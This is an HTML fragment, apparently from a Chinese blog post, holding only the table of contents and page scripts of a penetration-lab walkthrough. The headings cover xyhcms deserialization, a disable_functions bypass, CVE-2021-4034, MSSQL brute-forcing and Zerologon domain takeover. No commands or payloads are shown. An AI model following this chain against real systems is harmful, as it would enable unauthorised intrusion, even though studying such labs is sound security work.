href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xyhcms%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.2.1.</span> <span class="nav-text">xyhcms反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9D%E5%A1%94disfunction%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.2.</span> <span class="nav-text">宝塔disfunction绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.3.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2021-4034"><span class="nav-number">2.3.1.</span> <span class="nav-text">CVE-2021-4034</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag1"><span class="nav-number">2.4.</span> <span class="nav-text">Flag1</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">3.</span> <span class="nav-text">数据库服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="nav-number">3.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSSql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.</span> <span class="nav-text">MSSql数据库爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.3.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag2"><span class="nav-number">3.4.</span> <span class="nav-text">Flag2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.</span> <span class="nav-text">域控</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="nav-number">4.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-1472"><span class="nav-number">4.2.</span> <span class="nav-text">CVE-2020-1472</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96DC%E4%B8%BB%E6%9C%BA%E5%90%8D"><span class="nav-number">4.2.1.</span> <span class="nav-text">获取DC主机名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%BF%9E%E6%8E%A5DC%E6%B8%85%E7%A9%BA%E5%87%AD%E6%8D%AE"><span class="nav-number">4.2.2.</span> <span class="nav-text">2、连接DC清空凭据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85Hash"><span class="nav-number">4.2.3.</span> <span class="nav-text">3、获取域内Hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E9%80%9A%E8%BF%87Hash%E8%BF%9E%E6%8E%A5%E5%9F%9F%E6%8E%A7"><span class="nav-number">4.2.4.</span> <span class="nav-text">4、通过Hash连接域控</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81%E6%81%A2%E5%A4%8D%E5%AF%86%E7%A0%81"><span class="nav-number">4.2.5.</span> <span class="nav-text">5、恢复密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flag3"><span class="nav-number">4.3.</span> <span class="nav-text">Flag3</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
